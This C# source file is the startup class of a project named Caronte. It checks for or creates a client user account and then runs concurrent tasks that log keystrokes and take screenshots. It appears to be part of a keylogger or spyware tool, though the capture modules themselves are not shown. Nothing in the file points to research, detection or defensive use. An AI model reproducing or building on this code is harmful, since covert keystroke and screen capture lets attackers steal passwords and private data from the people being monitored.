using Caronte.Modules.Command;
using Caronte.Modules.CreateClientUser;
using Caronte.Modules.Information;
using MediatR;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte
{
    public class Execution
    {
        private readonly IMediator _mediator;
        private readonly CancellationToken _cancellationToken;

        public Execution(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;
        }

        public async Task Initialize()
        {
            await _mediator.Send(new VerifyAndCreateClientUserCommand());
            
            var tasksList = new List<Task>
            {
                StartInformationServices.InitializeKeyboardLogTask(_cancellationToken, _mediator),
                StartInformationServices.InitializePrintScreenTask(_cancellationToken, _mediator),
            };

            await Task.WhenAll(tasksList);
        }
    }
}
